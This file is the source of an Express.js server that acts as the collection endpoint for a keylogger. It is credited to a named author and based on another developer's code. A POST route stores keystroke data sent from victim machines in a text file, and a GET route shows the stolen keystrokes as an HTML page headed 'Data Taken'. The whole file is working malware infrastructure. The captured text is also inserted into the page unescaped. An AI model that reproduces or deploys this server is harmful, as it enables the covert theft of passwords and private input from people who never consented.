// Code written by Nitish Gupta
// This server code was based of code by githubuser: davidbombal

const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");
const port = 8080;

const app = express();

app.use(bodyParser.json({extended: true}));

app.get("/", (req, res) => {
    try{
        const keyLoggerData = fs.readFileSync("./keyboard_capture.txt", {encoding: 'utf8', flag: 'r'});
        res.send(
            `<h1> Data Taken <h1>
            <p>${keyLoggerData.replace("\n", "<br>")}</p>`
        )
    }catch{
        res.send(`<h1>No Data Taken <h1>`)
    }
});

app.post("/", (req, res) => {
    fs.writeFileSync("keyboard_capture.txt", req.body.keyLoggerData);
    res.send("Data sent.")
});

app.listen(port, ()=>{
    console.log(`App is listening. Port: ${port}`)
})